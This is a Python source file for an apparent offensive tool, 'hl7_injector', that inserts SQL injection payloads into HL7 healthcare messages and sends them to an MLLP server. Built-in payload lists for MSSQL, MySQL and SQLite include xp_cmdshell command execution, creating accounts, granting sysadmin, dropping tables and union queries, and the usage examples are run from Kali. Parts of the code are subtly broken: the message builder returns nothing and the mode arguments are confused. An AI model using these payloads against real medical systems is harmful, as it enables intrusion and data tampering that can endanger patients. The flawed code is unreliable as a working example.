'''
hl7_injector
Never use hl7_fuzzer in production Environment, you may seriously harm peoples health!!! hl7_fuzzer is for testing purpose only.

hl7_injector will build "Evil Messages" and send them to the MLLP Server.

Install dependencies:
python-hl7 is available on PyPi via pip or easy_install:

pip install -U hl7

For recent versions of Debian and Ubuntu, the python-hl7 package is available:

sudo apt-get install python-hl7


Check out this site if you need more Message templates:
http://www.mieweb.com/wiki/Sample_HL7_Messages#MDM.5ET02

Don't have a test Environment yet? Use this tools:
http://smarthl7.com/

Special thanks to this great project:
https://python-hl7.readthedocs.io/en/latest/

Example usage injection mode with builtin payload:
root@kali:~# python hl7_fuzz.py 192.168.188.3 1234 inject -p MSSQL -i PID.5.1
[+] Starting injection
[+] Starting message builder
[+] Starting MLLP sender
[+] Message type accepted: ADT = Admit Discharge Transfer
...

Example usage injection mode with custom payload:
root@kali:~# python hl7_fuzz.py 192.168.188.3 1234 inject -p custom -i PID.5.1
[+] Starting injection
Enter your payload: 'This is a really Evil String'
[+] Starting message builder
[+] Starting MLLP sender
[+] Message type accepted: ADT = Admit Discharge Transfer
...
'''
import hl7
import datetime
import time
import sys
import os
import argparse

from hl7.client import MLLPClient

#payloads from https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/
def mssqlDetect():
    payload = ["'; exec master..xp_cmdshell 'ping 10.10.1.2'--",
    "'create user name identified by 'pass123' --",
    "'create user name identified by pass123 temporary tablespace temp default tablespace users;",
    "' ; drop table temp --",
    "'exec sp_addlogin 'name' , 'password' --",
    "' exec sp_addsrvrolemember 'name' , 'sysadmin' --",
    "' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",
    "' grant connect to name; grant resource to name; --",
    "' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",
    "' or 1=1 --",
    "' union (select @@version) --",
    "' union (select NULL, (select @@version)) --",
    "' union (select NULL, NULL, (select @@version)) --",
    "' union (select NULL, NULL, NULL,  (select @@version)) --",
    "' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",
    "' union (select NULL, NULL, NULL, NULL, NULL, (select @@version)) --"]
    return payload

def mysqlDetect():
    payload = ["1'1",
    "1 exec sp_ (or exec xp_)",
    "1 and 1=1",
    "1' and 1=(select count(*) from tablenames); --",
    "1 or 1=1",
    "1' or '1'='1",
    "1or1=1",
    "1'or'1'='1",
    "fake@ema'or'il.nl'='il.nl"]
    return payload

def sqliteDetect():
    payload = ["1'1",
    "1 and 1=1",
    "1' and 1=(select count(*) from tablenames); --",
    "1 or 1=1",
    "1' or '1'='1",
    "1or1=1",
    "1'or'1'='1",
    "fake@ema'or'il.nl'='il.nl",
    "SELECT name FROM sqlite_master WHERE type='table';",
    "SELECT sqlite_version();",
    "SELECT * FROM sqlite_master;"]
    return payload

#send message to host and port, check if response is "AA" which means message acceptedd
def mllpSender(host, port, message):
    try:
        if type(message) is str:
            h = hl7.parse(message)
        else:
            h = message
        with hl7.client.MLLPClient(host, port) as client:
            response = client.send_message(h)  # you might want to send `h` instead of `message`
    except Exception as e:
        print("[-] MLLP sending failed. Error: ", str(e))
        sys.exit(1)

#Build evilMessages for injection mode, with defined payload and injection point
def messageBuilder(message, payload, injectPoint):
    h = hl7.parse(message)
    split = injectPoint.split('.')
    try:
        h.segments(split[0])[0][int(split[1])][0][int(split[2])][0] = payload
    except:
        print("[-] Something went wrong while message building.")
        print("Message: ", message)
        print("Payload: ", payload)
        print("Inject Point: ", injectPoint)
        sys.exit()

#Injection mode
def injection(host, port, file, mode, inject, payload):
    print("[+] Starting injection")
    message = None
    if mode != "file":
        with open(file, 'r') as f:
            message = f.read()
    if mode == "file":
        try:
            with open(payload, 'r') as file:
                i = 0
                for line in file:
                    line = line.strip()
                    with open(file, 'r') as f:
                        message = f.read()
                    modifiedMessage = messageBuilder(message, line, inject)
                    mllpSender(host, port, modifiedMessage)
                    i += 1
                print("[+] %s messages sent." %i)
                sys.exit()
        except Exception as e:
            print("[-] Something went wrong, check payload file. Error: ", str(e))
            sys.exit(1)
    elif mode == "custom":
        modifiedMessage = messageBuilder(message, payload, inject)
        mllpSender(host, port, modifiedMessage)
        print("[+] Message sent.")
        sys.exit()
    elif mode == "MSSQL":
        payload = mssqlDetect()
        for i, val in enumerate(payload):
            modifiedMessage = messageBuilder(message, val, inject)
            mllpSender(host, port, modifiedMessage)
        print("[+] %s messages sent." %len(payload))
        sys.exit()
    elif mode == "MYSQL":
        payload = mysqlDetect()
        for i, val in enumerate(payload):
            modifiedMessage = messageBuilder(message, val, inject)
            mllpSender(host, port, modifiedMessage)
        print("[+] %s messages sent." %len(payload))
        sys.exit()
    elif mode == "SQLITE":
        payload = sqliteDetect()
        for i, val in enumerate(payload):
            modifiedMessage = messageBuilder(message, val, inject)
            mllpSender(host, port, modifiedMessage)
        print("[+] %s messages sent." %len(payload))
        sys.exit()
    else:
        print("[-] Invalid mode selected!")
        sys.exit(1)

def injector():
    script_name = os.path.basename(sys.argv[0])
    parser = argparse.ArgumentParser()
    parser.add_argument('host', type=str, help='host to connect to')
    parser.add_argument('port', type=int, help='port to connect to')
    parser.add_argument('mode', type=str, help='operation mode (inject)')
    parser.add_argument('-f', '--file', type=str, help='file containing hl7 message template', default="hl7Message")
    parser.add_argument('-m', '--mode', type=str, help='inject mode (MSSQL, MYSQL, custom, file)', default="custom")
    parser.add_argument('-i', '--inject', type=str, help='injection point in hl7 message (e.g. PID.5.1)', default="PID.5.1")
    parser.add_argument('-p', '--payload', type=str, help='payload for injection. Can be a string or a file', default="This is a really Evil String")

    args = parser.parse_args()
    injection(args.host, args.port, args.file, args.mode, args.inject, args.payload)

if __name__ == '__main__':
    injector()
